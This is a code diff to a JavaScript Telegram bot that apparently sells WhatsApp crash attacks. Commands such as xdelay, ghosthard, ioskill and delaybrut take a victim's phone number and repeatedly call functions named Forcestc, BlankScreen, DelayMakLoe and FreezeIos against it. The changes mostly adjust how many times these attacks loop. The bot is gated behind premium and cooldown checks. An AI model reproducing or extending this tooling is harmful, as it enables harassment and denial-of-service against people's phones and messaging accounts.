@@ -1676,7 +1676,7 @@ bot.action('/tqto', async (ctx) => {
 
 bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /ghosthard 62×××`);
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xdelay 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   let mention = true;
 
@@ -1767,7 +1767,7 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 90; i++) {
+  for (let i = 0; i < 70; i++) {
     await Forcestc(sock, target);
     await sleep(5000);
     await BlankScreen(sock, target);
@@ -1820,7 +1820,7 @@ bot.command("combox", checkWhatsAppConnection, checkCooldown, async (ctx) => {
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 90; i++) {
+  for (let i = 0; i < 70; i++) {
     await DelayMakLoe(sock, target);
     await sleep(5000);
     await DelayMakLoe(sock, target);
@@ -1883,7 +1883,7 @@ bot.command("delaybrut", checkWhatsAppConnection, checkPremium, checkCooldown, a
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 90; i++) {
+  for (let i = 0; i < 70; i++) {
     await CrashBapakLowh(sock, target, mention = false);
     await Forcestc(sock, target);
     await sleep(5000);
@@ -1939,7 +1939,7 @@ bot.command("ghosthard", checkWhatsAppConnection, checkPremium, checkCooldown, a
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 90; i++) {
+  for (let i = 0; i < 70; i++) {
     await Forcestc(sock, target);
     await sleep(5000);
     await Forcestc(sock, target);
@@ -1997,7 +1997,7 @@ bot.command("xghost", checkWhatsAppConnection, async (ctx) => {
   const msg = await ctx.reply(` SUCCES SEND BUG TO ${cleanNum}...`);
   const target = cleanNum + "@s.whatsapp.net";
   
-  for (let i = 0; i < 90; i++) {
+  for (let i = 0; i < 70; i++) {
     await Forcestc(sock, target);
     await sleep(5000);
     await Forcestc(sock, target);
@@ -2065,7 +2065,7 @@ bot.command("delayv2", checkWhatsAppConnection, checkPremium, checkCooldown, asy
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 90; i++) {
+  for (let i = 0; i < 70; i++) {
     await DelayInvisible(sock, target);
     await sleep(5000);
     await DelayMakLoe(sock, target);
@@ -2124,7 +2124,7 @@ bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, asy
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 90; i++) {
+  for (let i = 0; i < 60; i++) {
     await FcNoClik(sock, target);
     await sleep(5000);
     await Forcestc(sock, target);
@@ -2420,7 +2420,7 @@ bot.on("callback_query", async (ctx) => {
 
     // === Eksekusi sesuai type & level ===
     if (type === "blank") {
-      const count = level === "low" ? 50 : level === "medium" ? 75 : 150;
+      const count = level === "low" ? 50 : level === "medium" ? 50 : 50;
       for (let i = 0; i < count; i++) {
         await BlankScreen(sock, target);
         await sleep(5000);
@@ -2434,7 +2434,7 @@ bot.on("callback_query", async (ctx) => {
         await sleep(4000);
       }
     } else if (type === "delay") {
-      const loops = level === "low" ? 4 : level === "medium" ? 100 : 10;
+      const loops = level === "low" ? 4 : level === "medium" ? 60 : 50;
       for (let i = 0; i < loops; i++) {
         await DelayMakLoe(sock, target);
         await sleep(5000);
@@ -2446,7 +2446,7 @@ bot.on("callback_query", async (ctx) => {
         await sleep(5000);
       }
     } else if (type === "ios") {
-      const count = level === "low" ? 20 : level === "medium" ? 80 : 100;
+      const count = level === "low" ? 20 : level === "medium" ? 80 : 50;
       for (let i = 0; i < count; i++) {
         await FreezeIos(sock, target);
         await sleep(5000);
